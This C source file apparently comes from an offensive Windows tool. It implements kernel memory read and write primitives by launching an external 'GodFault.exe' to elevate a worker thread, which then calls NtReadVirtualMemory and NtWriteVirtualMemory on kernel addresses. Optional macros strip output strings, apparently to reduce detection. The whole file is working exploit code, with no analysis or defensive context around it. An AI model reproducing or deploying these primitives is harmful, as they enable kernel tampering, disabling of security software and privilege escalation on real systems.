#define _CRT_SECURE_NO_WARNINGS

#include <ntstatus.h>
#define WIN32_NO_STATUS
#include <Windows.h>
#include <winternl.h>
#include <assert.h>
#include <tchar.h>

#if NO_STRINGS
#define _putts_or_not(...)
#define _tprintf_or_not(...)
#define wprintf_or_not(...)
#define printf_or_not(...)
#pragma warning(disable : 4189)

#else
#define _putts_or_not(...) _putts(__VA_ARGS__)
#define _tprintf_or_not(...) _tprintf(__VA_ARGS__)
#define printf_or_not(...) printf(__VA_ARGS__)
#define wprintf_or_not(...) wprintf(__VA_ARGS__)
#endif

#pragma comment(lib, "ntdll.lib")

EXTERN_C
NTSTATUS
NTAPI
NtReadVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_writes_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead
);

EXTERN_C
NTSTATUS
NTAPI
NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

typedef enum
{
    WorkerThreadOperation_Read = 0,
    WorkerThreadOperation_Write = 1,
    WorkerThreadOperation_Shutdown = 2,
} WorkerThreadOperation;

typedef struct
{
    SRWLOCK lock;

    HANDLE hWorkerThread;

    HANDLE hWorkerThreadSignal;
    HANDLE hWorkerThreadComplete;

    WorkerThreadOperation op;
    PVOID Address;
    PVOID Buffer;
    SIZE_T Size;
    SIZE_T BytesReturned;
} WorkerThreadInfo;

WorkerThreadInfo gWorkerThreadInfo = { 0 };

DWORD WINAPI BlessedThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    NTSTATUS ntStatus = 0;

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    _tprintf_or_not(TEXT("Worker thread started with TID: %u\n"), GetCurrentThreadId());

    while (TRUE)
    {
        WaitForSingleObject(gWorkerThreadInfo.hWorkerThreadSignal, INFINITE);

        AcquireSRWLockExclusive(&gWorkerThreadInfo.lock);
        {
            if (WorkerThreadOperation_Shutdown == gWorkerThreadInfo.op)
            {
                SetEvent(gWorkerThreadInfo.hWorkerThreadComplete);
                TerminateThread(GetCurrentThread(), 0);
            }
            else if (WorkerThreadOperation_Read == gWorkerThreadInfo.op)
            {
                //if (!ReadProcessMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned))
                ntStatus = NtReadVirtualMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned);
                if (!NT_SUCCESS(ntStatus))
                {
                    _tprintf_or_not(TEXT("NtReadVirtualMemory(%p) failed with NTSTATUS %08x\n"), gWorkerThreadInfo.Address, ntStatus);
                    exit(1);
                }
            }
            else if (WorkerThreadOperation_Write == gWorkerThreadInfo.op)
            {
                //if (!WriteProcessMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned))
                ntStatus = NtWriteVirtualMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned);
                if (!NT_SUCCESS(ntStatus))
                {
                    _tprintf_or_not(TEXT("NtWriteVirtualMemory(%p) failed with NTSTATUS %08x\n"), gWorkerThreadInfo.Address, ntStatus);
                    exit(1);
                }
            }

            SetEvent(gWorkerThreadInfo.hWorkerThreadComplete);
        }
        ReleaseSRWLockExclusive(&gWorkerThreadInfo.lock);
    }
}

HANDLE GetDriverHandle_GodFault()
{
    STARTUPINFOW startInfo = { 0 };
    PROCESS_INFORMATION procInfo = { 0 };
    DWORD dwExitCode = 0;
    wchar_t commandLine[MAX_PATH] = { 0 };

    if (NULL != gWorkerThreadInfo.hWorkerThread) {
        return gWorkerThreadInfo.hWorkerThread;
    }

    InitializeSRWLock(&gWorkerThreadInfo.lock);
    gWorkerThreadInfo.hWorkerThreadSignal = CreateEventW(NULL, FALSE, FALSE, NULL);
    gWorkerThreadInfo.hWorkerThreadComplete = CreateEventW(NULL, FALSE, FALSE, NULL);
    gWorkerThreadInfo.hWorkerThread = CreateThread(NULL, 0, BlessedThread, NULL, 0, NULL);
    Sleep(500);

    // Launch GodFault to bless the thread
    
    startInfo.cb = sizeof(startInfo);
    _snwprintf(commandLine, _countof(commandLine), L"GodFault.exe -t %u", GetThreadId(gWorkerThreadInfo.hWorkerThread));

    if (!CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo))
    {
        _tprintf_or_not(TEXT("[!] CreateProcessW(GodFault) failed, exiting...\n"));
        exit(EXIT_FAILURE);
    }
    
    if ((WAIT_OBJECT_0 != WaitForSingleObject(procInfo.hProcess, INFINITE)) ||
        !GetExitCodeProcess(procInfo.hProcess, &dwExitCode) || 
        (0 != dwExitCode))
    {
        _tprintf_or_not(TEXT("[!] GodFault returned failure, exiting...\n"));
        exit(EXIT_FAILURE);
    }

    return gWorkerThreadInfo.hWorkerThread;
}

VOID CloseDriverHandle_GodFault()
{
    //TerminateThread(gWorkerThreadInfo.hWorkerThread, 0);
}

VOID ReadMemoryPrimitive_GodFault(SIZE_T Size, DWORD64 Address, PVOID Buffer) 
{
    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("ReadMemoryPrimitive_GodFault: Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    GetDriverHandle_GodFault();

    AcquireSRWLockExclusive(&gWorkerThreadInfo.lock);
    {
        gWorkerThreadInfo.op = WorkerThreadOperation_Read;
        gWorkerThreadInfo.Address = (PVOID)Address;
        gWorkerThreadInfo.Size = Size;
        gWorkerThreadInfo.Buffer = Buffer;
        SetEvent(gWorkerThreadInfo.hWorkerThreadSignal);
    }
    ReleaseSRWLockExclusive(&gWorkerThreadInfo.lock);
    
    WaitForSingleObject(gWorkerThreadInfo.hWorkerThreadComplete, INFINITE);
}

VOID WriteMemoryPrimitive_GodFault(SIZE_T Size, DWORD64 Address, PVOID Buffer)
{
    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("WriteMemoryPrimitive_GodFault: Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    GetDriverHandle_GodFault();

    AcquireSRWLockExclusive(&gWorkerThreadInfo.lock);
    {
        gWorkerThreadInfo.op = WorkerThreadOperation_Write;
        gWorkerThreadInfo.Address = (PVOID)Address;
        gWorkerThreadInfo.Size = Size;
        gWorkerThreadInfo.Buffer = Buffer;
        SetEvent(gWorkerThreadInfo.hWorkerThreadSignal);
    }
    ReleaseSRWLockExclusive(&gWorkerThreadInfo.lock);

    WaitForSingleObject(gWorkerThreadInfo.hWorkerThreadComplete, INFINITE);
}

